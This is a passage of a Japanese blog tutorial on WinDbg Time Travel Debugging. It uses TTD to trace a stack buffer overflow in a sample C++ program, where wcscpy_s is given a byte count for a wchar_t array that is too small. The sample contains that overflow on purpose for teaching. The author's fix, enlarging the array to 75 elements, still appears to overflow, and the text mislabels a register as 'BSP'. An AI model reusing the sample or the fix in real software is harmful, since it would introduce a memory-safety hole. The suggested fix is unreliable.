&lt;h3 id=&quot;補足espとebpについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A3%9C%E8%B6%B3esp%E3%81%A8ebp%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;補足espとebpについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;補足：ESPとEBPについて&lt;/h3&gt;
&lt;p&gt;少しだけコンピュータの話に触れておきます。&lt;/p&gt;
&lt;p&gt;x64アーキテクチャなどのCPUで稼働するコンピュータ上で関数を呼び出す場合は、CALL命令が利用されます。&lt;/p&gt;
&lt;p&gt;CALL命令は、簡単に言うと以下の処理を実行する命令です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CALL命令の次の命令のアドレスをスタックに格納する（CALLする関数の処理がすべて完了したら、この時スタックしたアドレスが呼び出される）&lt;/li&gt;
&lt;li&gt;CALLする関数のメモリアドレスにジャンプする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/tobira-code/items/75d3034aed8bb9828981&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86-64プロセッサのスタックを理解する - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;詳しくは、こちらの記事にまとめていますので、良ければ参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-007-memory-spoofing&quot;&gt;WinDbgでスタックポインタの指すメモリの情報を書き換えて任意の関数を実行させてみる&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;問題の原因箇所を特定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%95%8F%E9%A1%8C%E3%81%AE%E5%8E%9F%E5%9B%A0%E7%AE%87%E6%89%80%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;問題の原因箇所を特定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;問題の原因箇所を特定する&lt;/h3&gt;
&lt;p&gt;ここで、先ほど確認したように、BSPレジスタの値が示すアドレスは文字列になっていました。&lt;/p&gt;
&lt;p&gt;今回のサンプルのようなプログラムの場合、BSPに格納されているアドレスは、main関数の処理が完了した後に呼び出される命令のアドレスとなることが想定されます。&lt;/p&gt;
&lt;p&gt;では、一体どこでスタックが破壊されたのか、それを特定していきましょう。&lt;/p&gt;
&lt;p&gt;次のコマンドでmain関数にブレークポイントを設定した状態で、[Go Back]ボタンを押して時間を巻き戻します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;bu ttd_tutorial!main&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;するとmain関数の先頭で停止するので、BSPにメモリアドレスがプッシュされるまで[Step Into]で処理を進めます。&lt;/p&gt;
&lt;p&gt;BSPにアドレスがプッシュされた直後のメモリの情報を見ると、この時点ではまだ文字列ではなく、main関数実行後に呼び出される命令のアドレスが格納されています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8df57812168816d1b3f7494929bc0953/2bef9/image-47-1024x578.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACB0lEQVQoz12S65KaQBBGff/3yTtkk3+uArIoslkRBOQOw/WkZ0hlk7WqS2qgznyX3lmuz4sb8e01wo0asrzlI4pJ8oK6V3TjSDuMdDJ1q7gGN7zLO8GviFv4ILynxI8nYZSRpAU7y7IIrj5DnaN/VTnQxBVLMbNWCzT6UGaAdV05Hm32+wOn0xvOycWyHdw3jzTL6bqe3eH1wPlykdvu1E1H/uyIbzFZnDG20wbqV5DHeV5wnJOMg+9fOJ/PAj7Jv0dd14ziZnc8HgmCgPs9ZBgmilwJLCFPctq8QZU93bNlaAemacKybGzbNjDP83Bdl4sIKsoSpZQGOvLiKv6fYkncic2+GkHxOatJQxRigCdR+BVYCrDvjeXv8sFPotBlGp+U+Z0yDSTTB2OdyiSMncyQ0HcpOnNt83q9mqg0UIOLohCHgyg8/ODj3SJLpJg+pSpimuIm+aUogZlpZboHbfPYgCZD36jUeRqgKBxkE3a6sfMlIAwj2m4SyyuJFJI+CirJrpI1qstOzlux1WAdrf8y3IBvlFW1KdQ3avlheGNZ9Noo4iiiLEqWXg6GlXVe/2Q4C8zB0UCx+wn05MJqa/l1v5dQfdJUbKnRtFzd5WU6Mj/nbQfVVsqyrAZoW18VeqaUvwp9XysMZZdasrQxz1EcSwmKeVykrNmoU2owdp1/Wv4EbpZ/A82gNdfb8y55AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8df57812168816d1b3f7494929bc0953/8ac56/image-47-1024x578.webp 240w,
/static/8df57812168816d1b3f7494929bc0953/d3be9/image-47-1024x578.webp 480w,
/static/8df57812168816d1b3f7494929bc0953/e46b2/image-47-1024x578.webp 960w,
/static/8df57812168816d1b3f7494929bc0953/a9a89/image-47-1024x578.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8df57812168816d1b3f7494929bc0953/8ff5a/image-47-1024x578.png 240w,
/static/8df57812168816d1b3f7494929bc0953/e85cb/image-47-1024x578.png 480w,
/static/8df57812168816d1b3f7494929bc0953/d9199/image-47-1024x578.png 960w,
/static/8df57812168816d1b3f7494929bc0953/2bef9/image-47-1024x578.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8df57812168816d1b3f7494929bc0953/d9199/image-47-1024x578.png&quot;
            alt=&quot;image-47-1024x578.png&quot;
            title=&quot;image-47-1024x578.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;DisassemblyウインドウとMemoryウインドウを見比べながら何度か[Step Over]で処理を進めていくと、&lt;code class=&quot;language-text&quot;&gt;GetCppConGreetingPwy&lt;/code&gt;関数を呼び出した直後にスタックが破壊されたことがわかりました。&lt;/p&gt;
&lt;p&gt;↓ スタック破壊前&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1e99b97d538901f0412fcb48be81cab8/0b533/image-48.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACIElEQVQoz1WTaW7bQAyFff+T9BztjwZF0Bi2tWu0WiNr3z3a7FfOJGkbAQQ5EOcjHykdPD/Cm5fh22sCM2lQ1R2uaYG0qNAOd4xixXhflHV0juIUYcTBKSfLa+RFg7JqKW5QNz0OhmkiuUYoeIjH/kQ/bvQyA89TtH2HuxAYpxFimSGfi2bgdNZg2a6KbYepOMsryhM46McTLEqIXQ8FVa/SkoyjzwuMZaV8X5QYyKa6gaETxLIQBD4s8q7rwHEcDMOAbdtwOP58wYns7fsPRLqFzL0iPGm4mQydl6ALyK7v1iYcmqbBNC14nqc8Yy5cxtC2LZZlwcGilmOeIU5SLDswjEBdDVilwie+PPIogbIzz2MENJVnzPsH1M4vYM5vBN4R21KiLTl1EmAuc6xlgaUg3xTYuxK7qGhu70ApWQI/JTdNg3VdCXj5BeYeYZuvmEVBwBuqyMfAOab0hpFkjhmHqDNsov6vQw+GaRDMpqXYqkMFNAwbUZTQlkra0oq+2zENAs8F2En2Nj+xrU/sD4q3J87nM3RDp7m5ytu2pQr8lXyhBFktikLa1B0Vze+Wc+R1jm1fv87w8cDlclEgRotQQIeA9gdwJaCcQxCGahZi3tB1ApxfkWQJxnGi7jZVeZ5n5TVNhyGBH0uR92zboXvdu2Rd1+H7PuI4hqC/oq5GNHVN8icqMKtvSyZKk1BdN9QSgiAgkK227LoMfd+rnD87SDCQKCF7DgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1e99b97d538901f0412fcb48be81cab8/8ac56/image-48.webp 240w,
/static/1e99b97d538901f0412fcb48be81cab8/d3be9/image-48.webp 480w,
/static/1e99b97d538901f0412fcb48be81cab8/b0a15/image-48.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1e99b97d538901f0412fcb48be81cab8/8ff5a/image-48.png 240w,
/static/1e99b97d538901f0412fcb48be81cab8/e85cb/image-48.png 480w,
/static/1e99b97d538901f0412fcb48be81cab8/0b533/image-48.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1e99b97d538901f0412fcb48be81cab8/0b533/image-48.png&quot;
            alt=&quot;image-48.png&quot;
            title=&quot;image-48.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;↓ スタック破壊後&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7e9f90fc440fcfb013fd35325207dfee/0b533/image-49.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACHElEQVQoz22SaZKbMBCFff+D5CxxkrEr9gAS62AwZhMg9sXjl5bsSeVHVPWqkVB96uXtvCDEwUvx7UcEI6ogqhZRkuOaFhCyg+wnyG7UsSVdohs+wgRXupPlAmkmkBc1xQqlaLBjnCG5RuiqDHgA/XBH3dQQdUWAFuM00tlAcYJapslwOr3DdjxYjIPbLkyLI7llaGSLnXE44vzzDe7ZwM0PUUYZ8kuIJknR5QW6LEerlOboCwFmMXDGEAQBHNuG67lgtO+6Ftu2Ynf69QZ+OuO03yN2A4LluBgcmRuij0sMSYm+pKgkBEzD1FDP82ET0PM9HWUjMc8zdtz2EFJfLnGCjUruOqAtRmw91TeSnpX+XaZp6Yxcj0Ccw/efYCklJgU0zt/huUd4zgHrXECKG+Q1xCZyoBF4VCUeglST5oqApgaqkm2bw3GfJdd1jWVZFHBPsCMC/zeWuSRgChldMKUpFtKU3DDmCeY6xedSwbKeQFUqp4E6jqPPmqZ5AhmzyQoJsoyykxP92NCTTe4L8LnR4O+khzaAjoZhwDCNV2YWTdvWWSug7uH7+1n3IQh8jONMqQ9kgRhxFmNavhr4+KeHpga6/wMuBGSWRbAPuuDQCxtNa6JsUxTUu3Ecsa6rLkW9rr4tmrCpgK+hfIHVUJaVSrY0MEAcU0bTiqoaIMgeDV0YyNTbdifQ9tITyF/TVT5U9lF7SaZelhV/AGhmMLpFANVVAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7e9f90fc440fcfb013fd35325207dfee/8ac56/image-49.webp 240w,
/static/7e9f90fc440fcfb013fd35325207dfee/d3be9/image-49.webp 480w,
/static/7e9f90fc440fcfb013fd35325207dfee/b0a15/image-49.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7e9f90fc440fcfb013fd35325207dfee/8ff5a/image-49.png 240w,
/static/7e9f90fc440fcfb013fd35325207dfee/e85cb/image-49.png 480w,
/static/7e9f90fc440fcfb013fd35325207dfee/0b533/image-49.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7e9f90fc440fcfb013fd35325207dfee/0b533/image-49.png&quot;
            alt=&quot;image-49.png&quot;
            title=&quot;image-49.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このことから、スタック破壊の原因は&lt;code class=&quot;language-text&quot;&gt;GetCppConGreetingPwy&lt;/code&gt;関数に存在することが特定できました。&lt;/p&gt;
&lt;h3 id=&quot;getcppcongreetingpwy関数のデバッグ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#getcppcongreetingpwy%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%83%90%E3%83%83%E3%82%B0&quot; aria-label=&quot;getcppcongreetingpwy関数のデバッグ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GetCppConGreetingPwy関数のデバッグ&lt;/h3&gt;
&lt;p&gt;TTDトレース内の時間を少し戻して、今度は&lt;code class=&quot;language-text&quot;&gt;GetCppConGreetingPwy&lt;/code&gt;関数の処理を追ってみました。&lt;/p&gt;
&lt;p&gt;すると、&lt;code class=&quot;language-text&quot;&gt;wcscpy_s&lt;/code&gt;関数を呼び出した直後にスタックが破壊されたことがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4d151361fce7650a5121ec8d9bf7f8af/2bef9/image-50-1024x575.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAAB6ElEQVQoz3WSbZOTMBSF+///lB+ccRx1XVelQBK6QKAtS3gpaWiB0uNNqNVdx8ycuQTIk3Nys4rjBHm+g1INus44HQ4djOkxDCPGcXolme0Q8hjP8RYyf0GaFci2pVO+U1gFvg8pJS6XCXYYM2GeL/jf4FzAW/tgjEMIAUbzIAiw3xfOyMrzPNotpt1HAgFa2zq7xdfr9ZXsECJCGIYE5ogIuMwD1HVNiQashLA7cRTFHk3T0i4G4zQ4lwvkasmLaDDGyNECtA6jaEPvQlRVhdPphNV6HdDLBLZqPRDwgizb4jmVqOqWfprQ9wNpScApqoUuQO6AnOZ3YBA8IJUe4viJFhU4mgplSY5Lhrp9hj5mOHSpq0BHoJAiMmw2G2yi6B5ZKUXAMzn88h7rz++Q/PyIHX9EGfukJzSpB52HOGQ+ujxAR1VvGULfQ8h+x43AxdIU6/B8JuCPh2/wvn7H44dPkCyGkjXSdYS9kND0fMwb6BdS2cColoDBvSkWugD9P01h9CHLcyQyxTBdYPoZlapxNiNgb8+bGyTcNfkLyBdgVd2A9to465xhmmZ07UhRO8yKSDURFKl1x+fg4hbxX+Atsj3gJEndIWtt0DY96i1FLQ1O1Rmm6EkGpuwx9pMDhfcuizdnOOAXFtczjy08/3QAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4d151361fce7650a5121ec8d9bf7f8af/8ac56/image-50-1024x575.webp 240w,
/static/4d151361fce7650a5121ec8d9bf7f8af/d3be9/image-50-1024x575.webp 480w,
/static/4d151361fce7650a5121ec8d9bf7f8af/e46b2/image-50-1024x575.webp 960w,
/static/4d151361fce7650a5121ec8d9bf7f8af/a9a89/image-50-1024x575.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4d151361fce7650a5121ec8d9bf7f8af/8ff5a/image-50-1024x575.png 240w,
/static/4d151361fce7650a5121ec8d9bf7f8af/e85cb/image-50-1024x575.png 480w,
/static/4d151361fce7650a5121ec8d9bf7f8af/d9199/image-50-1024x575.png 960w,
/static/4d151361fce7650a5121ec8d9bf7f8af/2bef9/image-50-1024x575.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4d151361fce7650a5121ec8d9bf7f8af/d9199/image-50-1024x575.png&quot;
            alt=&quot;image-50-1024x575.png&quot;
            title=&quot;image-50-1024x575.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここまで特定できたところで、ソースコードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;cpp&quot;&gt;&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;array&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;cstring&gt;&lt;/span&gt; &lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;GetCppConGreeting&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;buffer&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size_t size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; message &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; L&lt;span class=&quot;token string&quot;&gt;&quot;HELLO FROM THE WINDBG TEAM. GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;wcscpy_s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buffer&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;array&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; greeting&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;GetCppConGreeting&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;greeting&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;greeting&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;%ls\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; greeting&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;どうやらワイド文字列で50字分しか設定されていなかった配列&lt;code class=&quot;language-text&quot;&gt;greeting&lt;/code&gt;に対して、75文字の&lt;code class=&quot;language-text&quot;&gt;message&lt;/code&gt;を書き込んだことで、スタックオーバフローが発生したことが原因のようです。&lt;/p&gt;
&lt;p&gt;そこで配列&lt;code class=&quot;language-text&quot;&gt;greeting&lt;/code&gt;の要素数を75に修正した&lt;code class=&quot;language-text&quot;&gt;ttd_tutorial_fixed.cpp&lt;/code&gt;を使用して&lt;code class=&quot;language-text&quot;&gt;ttd_tutorial_fixed.exe&lt;/code&gt;を作成しました。&lt;/p&gt;
&lt;p&gt;これで無事にエラーが解消され、無事に実行に成功しました！&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ ttd_tutorial_fixed&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe
HELLO &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; THE WINDBG TEAM&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
